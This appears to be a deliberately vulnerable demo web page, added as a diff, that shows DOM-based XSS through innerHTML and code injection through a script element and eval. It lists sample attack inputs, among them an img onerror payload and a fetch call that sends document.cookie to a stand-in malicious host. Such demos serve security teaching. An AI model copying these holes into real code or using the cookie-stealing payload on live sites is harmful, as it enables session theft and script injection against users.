@@ -1,1 +1,117 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Vulnerable Web App</title>
+</head>
+<body>
+    <h1>Vulnerable Web Application</h1>
+    
+    <!-- 1. XSS Vulnerability -->
+    <div>
+        <h2>1. Stored XSS Example</h2>
+        <p>Enter your name (vulnerable to XSS):</p>
+        <input type="text" id="userInput" placeholder="Enter text">
+        <button onclick="displayInput()">Submit</button>
+        <div id="output"></div>
+        
+        <script>
+            function displayInput() {
+                const userInput = document.getElementById('userInput').value;
+                // Vulnerable code: Directly injecting user input into innerHTML
+                document.getElementById('output').innerHTML = "Hello, " + userInput + "!";
+            }
+        </script>
+    </div>
 
+    <!-- 2. eval() Vulnerability -->
+    <div style="margin-top: 30px; padding: 20px; background-color: #fff3f3; border: 1px solid #ffcccc; border-radius: 5px;">
+        <h2>2. eval() Vulnerability</h2>
+        <p>Enter a calculation (e.g., 2+2):</p>
+        <input type="text" id="calculation" placeholder="Enter calculation" style="padding: 5px; width: 300px;">
+        <button onclick="calculate()" style="padding: 5px 15px; background: #ff6b6b; color: white; border: none; border-radius: 3px; cursor: pointer;">Calculate</button>
+        <p id="result" style="min-height: 20px; padding: 5px; background: white; border: 1px solid #ddd;"></p>
+        
+        <div style="margin-top: 20px; padding: 10px; background: #fff8e1; border-left: 4px solid #ffc107;">
+            <h4>Try these examples:</h4>
+            <ul>
+                <li><code>2+2</code> - Normal calculation</li>
+                <li><code>alert('Hacked!')</code> - Shows an alert</li>
+                <li><code>window.alert('Hacked!')</code> - Alternative alert</li>
+                <li><code>document.body.style.background='red'</code> - Changes page background</li>
+                <li><code>document.cookie</code> - Shows current cookies</li>
+            </ul>
+        </div>
+        
+        <script>
+            // Store a test cookie to demonstrate the risk
+            document.cookie = "test_cookie=this_is_a_test_cookie; SameSite=None; Secure";
+            
+            function calculate() {
+                const calculation = document.getElementById('calculation').value;
+                const resultElement = document.getElementById('result');
+                
+                try {
+                    // Clear previous results
+                    resultElement.innerHTML = 'Executing...';
+                    
+                    // Create a new script element to execute the code
+                    const script = document.createElement('script');
+                    script.text = `
+                        try {
+                            // First try direct execution
+                            const result = (${calculation});
+                            document.getElementById('result').innerHTML = 
+                                '<strong>Executed:</strong> ' + 
+                                '<code>' + ${JSON.stringify(calculation)} + '</code><br>' +
+                                '<strong>Result:</strong> ' + 
+                                '<code>' + (typeof result === 'object' ? JSON.stringify(result) : String(result)) + '</code>';
+                        } catch (e) {
+                            // If direct execution fails, try with eval
+                            try {
+                                const result = eval(${JSON.stringify(calculation)});
+                                document.getElementById('result').innerHTML = 
+                                    '<strong>Executed (via eval):</strong> ' + 
+                                    '<code>' + ${JSON.stringify(calculation)} + '</code><br>' +
+                                    '<strong>Result:</strong> ' + 
+                                    '<code>' + (typeof result === 'object' ? JSON.stringify(result) : String(result)) + '</code>';
+                            } catch (e2) {
+                                document.getElementById('result').innerHTML = 
+                                    '<strong>Error executing:</strong> ' + 
+                                    '<code>' + escapeHtml(calculation) + '</code><br>' +
+                                    '<strong>Error:</strong> ' + escapeHtml(e2.message);
+                            }
+                        }
+                    `;
+                    
+                    // Execute the script
+                    document.body.appendChild(script);
+                    document.body.removeChild(script);
+                    
+                } catch (e) {
+                    resultElement.innerHTML = 
+                        '<strong>Error in execution:</strong> ' + 
+                        '<code>' + escapeHtml(calculation) + '</code><br>' +
+                        '<strong>Error:</strong> ' + escapeHtml(e.message);
+                }
+            }
+            
+            // Helper function to safely escape HTML
+            function escapeHtml(unsafe) {
+                if (!unsafe) return '';
+                return unsafe
+                    .replace(/&/g, "&amp;")
+                    .replace(/</g, "&lt;")
+                    .replace(/>/g, "&gt;")
+                    .replace(/"/g, "&quot;")
+                    .replace(/'/g, "&#039;");
+            }
+        </script>
+    </div>
+
+    <div style="margin-top: 30px; color: red;">
+        <h3>Try these malicious inputs:</h3>
+        <p>For XSS: <code>&lt;img src='x' onerror='alert("XSS Attack!")'&gt;</code></p>
+        <p>For eval(): <code>alert('Hacked!');</code> or <code>fetch('https://malicious-site.com/steal?cookie='+document.cookie)</code></p>
+    </div>
+</body>
+</html>
